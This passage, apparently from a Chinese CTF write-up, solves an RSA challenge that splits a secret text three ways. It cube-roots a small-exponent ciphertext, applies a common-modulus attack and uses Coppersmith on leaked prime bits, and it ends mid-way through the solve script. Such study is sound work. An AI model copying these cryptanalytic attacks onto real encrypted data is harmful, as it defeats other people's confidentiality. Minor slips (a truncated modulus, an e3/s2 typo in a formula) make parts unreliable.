href="#题目-15"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> text,flag<br><span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><br><span class="hljs-keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>]<br><br>msg1 = text[:xx]<br>msg2 = text[xx:yy]<br>msg3 = text[yy:]<br><br>msg1 = bytes_to_long(msg1)<br>msg2 = bytes_to_long(msg2)<br>msg3 = bytes_to_long(msg3)<br><br>p1 = getPrime(<span class="hljs-number">512</span>)<br>q1 = getPrime(<span class="hljs-number">512</span>)<br>N1 = p1*q1<br>e1 = <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg1,e1,N1)<br><span class="hljs-built_in">print</span> (e1,N1)<br><br>p2 = getPrime(<span class="hljs-number">512</span>)<br>q2 = getPrime(<span class="hljs-number">512</span>)<br>N2 = p2*q2<br>e2 = <span class="hljs-number">17</span><br>e3 = <span class="hljs-number">65537</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg2,e2,N2)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg2,e3,N2)<br><span class="hljs-built_in">print</span> (e2,N2)<br><span class="hljs-built_in">print</span> (e3,N2)<br><br>p3 = getPrime(<span class="hljs-number">512</span>)<br>q3 = getPrime(<span class="hljs-number">512</span>)<br>N3 = p3*q3<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">pow</span>(msg3,e3,N3)<br><span class="hljs-built_in">print</span> (e3,N3)<br><span class="hljs-built_in">print</span> p3&gt;&gt;<span class="hljs-number">200</span><br><br><br><span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br>(<span class="hljs-number">3</span>, <span class="hljs-number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L</span>)<br><span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br><span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>(<span class="hljs-number">17</span>, <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span>)<br>(<span class="hljs-number">65537</span>, <span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L</span>)<br><span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>(<span class="hljs-number">65537</span>, <span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span>)<br><span class="hljs-number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br><br></code></pre></td></tr></table></figure><h2 id="分析-15"><a class="markdownIt-Anchor" href="#分析-15"></a> 分析</h2><p>将text分成了三个部分，最后计算text的md5值作为flag</p><h3 id="第一部分"><a class="markdownIt-Anchor" href="#第一部分"></a> 第一部分</h3><p>e较小，且推测m也较小，可以直接开根</p><h3 id="第二部分"><a class="markdownIt-Anchor" href="#第二部分"></a> 第二部分</h3><p>使用了两个e进行加密，且两个e互素</p><p>有：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>m</mi><msub><mi>e</mi><mn>3</mn></msub></msup><mo>=</mo><msub><mi>c</mi><mn>3</mn></msub><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">m^{e_2}=c_2\quad mod(n)\\m^{e_3}=c_3\quad mod(n)\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span></span></span></span></p><p>利用扩展欧基里德计算：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub><mo>+</mo><msub><mi>s</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>e</mi><mn>3</mn></msub><mo>=</mo><mn>1</mn><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><msup><mo stretchy="false">)</mo><msub><mi>s</mi><mn>1</mn></msub></msup><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>3</mn></msub></msup><msup><mo stretchy="false">)</mo><msub><mi>s</mi><mn>2</mn></msub></msup><mo>=</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>∗</mo><msubsup><mi>c</mi><mn>3</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>s</mi><mn>1</mn></msub><mo>+</mo><mi>e</mi><mn>3</mn><mo>∗</mo><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mo>=</mo><msubsup><mi>c</mi><mn>2</mn><msub><mi>s</mi><mn>1</mn></msub></msubsup><mo>∗</mo><msubsup><mi>c</mi><mn>3</mn><msub><mi>s</mi><mn>2</mn></msub></msubsup><mo>=</mo><mi>m</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_1*e_2+s_2*e_3=1\\(m^{e_2})^{s_1}*(m^{e_3})^{s_2}=c_2^{s_1}*c_3^{s_2}\quad mod(n)\\m^{e_2*s_1+e3*e_2}=c_2^{s_1}*c_3^{s_2}=m\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.016308em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">3</span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h3 id="第三部分"><a class="markdownIt-Anchor" href="#第三部分"></a> 第三部分</h3><p>我们知道p的高312位，利用coppersmith进行高位攻击</p><p>(可以直接当板子题)</p><h2 id="exp-15"><a class="markdownIt-Anchor" href="#exp-15"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c1=<span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br>e1=<span class="hljs-number">3</span><br>n1=<span class="hljs-number">12381447039455059836328051884891454693813773102677797588584673367249449397570306976005386747183624947329082879996258685589268590290205063001831293901056494567669971224624982034171215593839806873286664642282661947718043485814893823566209248205899907910545013618168514189595557454867166732016774164107233025900</span><br><br>msg1=long_to_bytes(iroot(c1,e1)[<span class="hljs-number">0</span>])<br><br><br>c22=<span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br>c23=<span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>e2=<span class="hljs-number">17</span><br>n2=<span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br>e3=<span class="hljs-number">65537</span><br><br>_,s1,s2=gcdext(e2,e3)<br>msg2=long_to_bytes(<span class="hljs-built_in">int</span>((<span class="hljs-built_in">pow</span>(c22,s1,n2)*<span class="hljs-built_in">pow</span>(c23,s2,n2))%n2))<br><br>c3=<span 